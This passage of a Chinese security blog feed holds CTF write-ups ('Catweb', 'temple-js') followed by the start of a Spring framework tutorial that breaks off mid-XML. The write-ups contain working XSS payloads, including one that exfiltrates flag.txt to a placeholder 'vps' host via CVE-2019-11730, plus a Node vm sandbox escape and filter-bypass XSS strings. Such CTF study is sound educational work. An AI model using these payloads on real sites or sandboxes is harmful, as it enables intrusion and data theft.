javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:location=<span class="string">"http://139.224.236.99:8787"</span></span><br></pre></td></tr></table></figure><p>即可在自己的vps上监听到bot的请求</p><p>浏览完整个功能点后 回到第一个功能点可以发现可以进行json注入</p><p><img src="https://s1.ax1x.com/2020/03/18/8wF8UA.png" alt="8wF8UA.png"></p><p>那么就意味着我们直接控制回显字段了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img style&#x3D;&quot;max-width: 200px; max-height: 200px&quot; src&#x3D;&quot;static&#x2F;&#39;+kind+&#39;&#x2F;&#39;+cat+&#39;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>xss poc 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;content&quot;:[&quot;\&quot;&#x2F;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;],&quot;poc&quot;:&quot;</span><br></pre></td></tr></table></figure><p>其实这里我也比较好奇后台是怎么去检测这个路径的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..可以正常返回 而..&#x2F;xx&#x2F;..却不行</span><br><span class="line">但是..的逻辑实际上是等于..&#x2F;xx&#x2F;..的</span><br><span class="line">如果xx的形式可以的话 我们就用了另一种攻击方式 可以在kind处进行xss闭合</span><br><span class="line">emm 对这点同样有思考的师傅欢迎来一起讨论</span><br></pre></td></tr></table></figure><p>现在我们要做的是结合这个xss页面以及bot的点击将templates/flag.txt的内容带出</p><p>这里就用 <strong>CVE-2019-11730</strong> 这个漏洞</p><p><a href="https://github.com/alidnf/CVE-2019-11730" target="_blank" rel="noopener">POC及攻击视频</a></p><p>大概浏览下poc.html 可以得知这个CVE的攻击思路为通过当前location的file协议读取当前目录下的文件</p><p>部分代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (location.protocol != <span class="string">"file:"</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"- Error: File isn't loaded locally!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Use Clickjacking to trick the victim to click name of current file name in the hidden iframe.</span></span><br><span class="line">    <span class="comment">// First, Create a hidden iframe pointing to the parent directory.</span></span><br><span class="line">    <span class="keyword">var</span> exploit_iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    exploit_iframe.src = <span class="string">"./"</span>;</span><br><span class="line">    exploit_iframe.className = <span class="string">"exploit_iframe"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.append(exploit_iframe);</span><br><span class="line">    <span class="comment">// Second, Create a fake button and trick the user to click it.</span></span><br><span class="line">    <span class="keyword">var</span> fake_button = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">    fake_button.className = <span class="string">"fake_button"</span>;</span><br><span class="line">    fake_button.innerText = <span class="string">"Click Me! I have a gift for you!"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.append(fake_button);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过exploit iframe以及button click完成二次触发load和Bypass SOP</p><p>那么攻击思路就很明显了</p><ul><li>由于都是静态页面 file:///app/templates/index.html等价于catweb.zajebistyc.tf。</li><li>发送给后台bot file:///协议的payload 并且加上我们自己的js</li><li>后台点击触发</li></ul><p>Payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///app/templates/index.html?", "status": "ok", "content":["a\"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;location.href=<span class="string">'http://vps?q='</span>+<span class="built_in">encodeURIComponent</span>(btoa(xhr.responseText))&#125;; xhr.open(<span class="string">'GET'</span>, <span class="string">'flag.txt'</span>, <span class="literal">false</span>); xhr.send();  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"], "poc": "</span><br></pre></td></tr></table></figure><h3 id="temple-js"><a href="#temple-js" class="headerlink" title="temple-js"></a>temple-js</h3><p>通过这道题确实学到了很多</p><p>题目源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>)</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>)</span><br><span class="line"><span class="keyword">const</span> watchdog = <span class="built_in">require</span>(<span class="string">"./watchdog"</span>);</span><br><span class="line"></span><br><span class="line">global.flag = fs.readFileSync(<span class="string">"flag"</span>).toString()</span><br><span class="line"><span class="keyword">const</span> source = fs.readFileSync(__filename).toString()</span><br><span class="line"><span class="keyword">const</span> help = <span class="string">"There is no help on the way."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(<span class="string">'public'</span>))</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/repl'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> sandbox = vm.createContext(&#123;<span class="attr">par</span>: (<span class="function"><span class="params">v</span> =&gt;</span> <span class="string">`(<span class="subst">$&#123;v&#125;</span>)`</span>), source, help&#125;)</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/^[a-zA-Z0-9 $&#123;&#125;`]+$/g</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> command = req.body[<span class="string">'cmd'</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.ip&#125;</span>&gt; <span class="subst">$&#123;command&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(validInput.test(command))</span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="keyword">let</span> watch = watchdog.schedule()</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response = vm.runInContext(command, sandbox, &#123;</span><br><span class="line">                    timeout: <span class="number">300</span>,</span><br><span class="line">                    displayErrors: <span class="literal">false</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                watchdog.stop(watch)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid input."</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ex)</span><br><span class="line">    &#123;</span><br><span class="line">        response = ex.toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.ip&#125;</span>&lt; <span class="subst">$&#123;response&#125;</span>`</span>)</span><br><span class="line">    res.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"response"</span>: response&#125;))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Listening on :<span class="subst">$&#123;port&#125;</span>...`</span>)</span><br><span class="line">app.listen(port, <span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>代码量比较少，大意是逃逸掉沙箱拿到沙箱外定义的flag</p><p>对于沙箱逃逸：</p><p>我们可以通过constructor.constructor返回的Function来返回我们的flag</p><p>通过constructor.constructor拿到的Function为沙箱外的Function</p><p>首先来看一个例子</p><p><img src="https://s1.ax1x.com/2020/03/18/8013RO.png" alt="8013RO.png"></p><p>我们可以直接通过Function来定义一个任意内容的函数，第三种函数的定义用到了标签模板字符串</p><p>下图为给的例子</p><p><img src="https://s1.ax1x.com/2020/03/18/8BRleH.png" alt="8BRleH.png"></p><p>对应我们例子中的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ƒ anonymous(a,</span><br><span class="line">) &#123;</span><br><span class="line"><span class="number">49</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>template String作为最后一个参数传入函数体内 成为我们自定义的函数内容，而a则作为此函数的参数。</p><p>那么接下来就可以写一个返回沙箱外函数的anoymous了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="string">'return constructor.constructor'</span>&#125;</span>`</span><span class="string">``</span><span class="string">``</span> </span><br><span class="line"><span class="comment">// or ``</span></span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过我们输入的字符被正则限制了，不能有.这个字符，不过可以直接用</p><p>with条件进行代替，并且不允许有()，那我们可以用sandbox中的par函数来返回(constructor)来bypass这个正则，最终payload为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="string">`with<span class="subst">$&#123;par<span class="string">`construtor`</span>&#125;</span>return constructor`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure><p>再进行此anoymos函数的调用就可以获得Function了，然后再通过这个Function来返回沙箱外的flag.最后上个图：</p><p><img src="https://s1.ax1x.com/2020/03/18/8B5OwF.png" alt="8B5OwF.png"></p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>用Function配和template String进行xss同样是很棒的攻击手法：</p><p>比如下面的Payload(tw上看到的)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="built_in">unescape</span>. call<span class="string">`<span class="subst">$&#123;location&#125;</span>`</span>&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结合在url中输入%0aalert()&#x2F;&#x2F;即可实现xss</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;javascript</span><br><span class="line">&#x2F;&#x2F;拆分字母Bypass</span><br><span class="line">Function&#96;a$&#123;&#96;return &#96;+&#96;aler&#96;+&#96;t(1)&#96;&#125;&#96;</span><br><span class="line">&#x2F;&#x2F;字符编码Bypass</span><br><span class="line">Function&#96;a$&#123;&#96;\x61\x6c\x65\x72\x74\x28\x29&#96;&#125;</span><br></pre></td></tr></table></figure><pre><code></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Catweb&quot;&gt;&lt;a href=&quot;#Catweb&quot; class=&quot;headerlink&quot; title=&quot;Catweb&quot;&gt;&lt;/a&gt;Catweb&lt;/h4&gt;&lt;p&gt;先看一下题目的js代码&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞</title>
    <link href="http://yoursite.com/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-06T07:32:31.000Z</published>
    <updated>2020-03-06T07:35:08.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SpringMVC基础知识"><a href="#SpringMVC基础知识" class="headerlink" title="SpringMVC基础知识"></a>SpringMVC基础知识</h3><h4 id="Spring介绍"><a href="#Spring介绍" class="headerlink" title="Spring介绍"></a>Spring介绍</h4><blockquote><p>Spring是一个轻量级的Java Web开发框架，是分层的Java SE/EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。</p></blockquote><h4 id="spring调用的基本流程"><a href="#spring调用的基本流程" class="headerlink" title="spring调用的基本流程"></a>spring调用的基本流程</h4><p>1.发起请求到前端控制器(DispatcherServlet)<br>        2.前端控制器请求处理器映射器(HandlerMapping)查找Handler(可根据xml配置、注解进行查找)<br>        3.处理器映射器(HandlerMapping)向前端控制器返回Handler<br>        4.前端控制器调用处理器适配器(HandlerAdapter)执行Handler<br>        5.Handler执行完，给适配器返回ModelAndView(Springmvc框架的一个底层对象)<br>        6.处理器适配器(HandlerAdapter)向前端控制器返回ModelAndView<br>        7.前端控制器(DispatcherServlet)请求视图解析器(ViewResolver)进行视图解析，根据逻辑视图名解析成真正的视图(jsp)<br>        8.视图解析器(ViewResolver)向前端控制器(DispatcherServlet)返回View<br>        9.前端控制器进行视图渲染，即将模型数据(在ModelAndView对象中)填充到request域<br>        10.前端控制器向用户响应结果</p><h3 id="Spring-IoC思想"><a href="#Spring-IoC思想" class="headerlink" title="Spring IoC思想"></a>Spring IoC思想</h3><p>IoC思想的作用：主要可通过IoC写出松耦合，更优良的程序。</p><p>在之前的编程中，当我们当前的类依赖另一个类的时候，我们会在这个类的内部去主动创建所依赖的类，从而会导致类之间的高耦合。</p><p>而在Spring 框架中：有了IoC容器，容器会自动帮我们去查找以及注入所依赖对象，对象不再是去主动创建所依赖的类，而是被动的接受所依赖的类，并且new实例工作不由程序来做而是交给Spring容器去做，这也就是为什么IoC叫做控制反转的原由。</p><p>Spring提供了两种IoC容器，分别为BeanFactory和ApplicationContext。</p><ul><li>BeanFactory：<br>BeanFactory是spring中比较原始，比较古老的Factory。因为比较古老，所以BeanFactory无法支持spring插件，例如：AOP、Web应用等功能。</li><li>ApplicationContext：<br>ApplicationContext是BeanFactory的子类，因为古老的BeanFactory无法满足不断更新的spring的需求，于是ApplicationContext就基本上代替了BeanFactory的工作，以一种更面向框架的工作方式以及对上下文进行分层和实现继承，并在这个基础上对功能进行扩展：<br>1.MessageSource, 提供国际化的消息访问<br>2.资源访问（如URL和文件）<br>3.事件传递<br>4.Bean的自动装配<br>5.各种不同应用层的Context实现</li></ul><p>在现在的开发工作中，都会尽可能的使用ApplicationContext而非BeanFactory</p><h4 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h4><p>BeanFactory的类体系结构</p><p><img src="https://s2.ax1x.com/2020/03/05/37z6bt.png" alt="37z6bt.png"></p><p>而BeanFactory最常用的API为XmlBeanFactory</p><p>Demo略</p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>ApplicationContext类体系：</p><p><img src="https://s2.ax1x.com/2020/03/05/3HFZz8.png" alt="3HFZz8.png"></p><p>ApplicationContext 最常用接口：</p><ul><li><strong>FileSystemXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。在这里，你需要提供给构造器XML文件的绝对路径；</li><li><strong>ClassPathXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。无需提供XML文件的完整路径，只需正确配置CLASSPATH环境变量即可，因为容器会从CLASSPATH中搜索Bean配置文件；</li><li><strong>WebXmlApplicationContext</strong>：该容器会在一个Web应用程序的范围内加载在XML文件中已被定义的 bean；</li></ul><p>Demo略</p><h4 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h4><p>在获取ApplicationContext实例后，就可以像BeanFactory一样调用getBean(beanName)返回Bean了。ApplicationContext的初始化和BeanFactory有一个重大的区别：BeanFactory在初始化容器时，并未实例化Bean,直到第一次访问某个Bean时才实例化目标Bean；而ApplicationContext则在初始化应用上下文时就实例化所有单实例的Bean。</p><h4 id="依赖注入-DI"><a href="#依赖注入-DI" class="headerlink" title="依赖注入(DI)"></a>依赖注入(DI)</h4><blockquote><p>当某个Java实例需要另一个Java实例时，传统的方法是由调用者创建被调用者的实例（例如，使用new关键字获得被调用者实例），而使用Spring框架后，被调用者的实例不再由调用者创建，而是由Spring容器创建，这称为控制反转。Spring容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过Spring容器获得被调用者实例，这称为依赖注入。</p></blockquote><p>而Spring 正是通过这种依赖注入来管理Bean对象之间的依赖关系</p><p>依赖注入主要实现的两种方法有setter和构造方法注入：</p><h5 id="setter方法的依赖注入"><a href="#setter方法的依赖注入" class="headerlink" title="setter方法的依赖注入"></a>setter方法的依赖注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> String msg;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMsg</span><span class="params">()</span> </span>&#123;     </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(String msg)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"helloBean"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.spring.demo.HelloWorld"</span>&gt;    </span><br><span class="line">       &lt;property name=<span class="string">"msg"</span> value=<span class="string">"Hello World!"</span>/&gt;    </span><br><span class="line"> &lt;/bean&gt;</span><br></pre></td></tr></table></figure><h5 id="构造方法注入"><a href="#构造方法注入" class="headerlink" title="构造方法注入"></a>构造方法注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> Message msg;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">(Message msg)</span></span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">getMsg</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloclass"</span> <span class="attr">class</span>=<span class="string">"com.time.Helloworld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"msg"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"msg"</span> <span class="attr">class</span>=<span class="string">"com.test.time"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="集合注入"><a href="#集合注入" class="headerlink" title="集合注入"></a>集合注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.action;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line"><span class="keyword">import</span> java.util.Set;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DI</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Map map;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Set Set;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> List list;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Properties pro;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Map <span class="title">getMap</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMap</span><span class="params">(Map map)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.map = map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Set <span class="title">getSet</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> Set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSet</span><span class="params">(Set set)</span> </span>&#123;  </span><br><span class="line">  Set = set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> List <span class="title">getList</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setList</span><span class="params">(List list)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.list = list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Properties <span class="title">getPro</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> pro;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPro</span><span class="params">(Properties pro)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.pro = pro;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">beans</span> <span class="meta-keyword">PUBLIC</span> <span 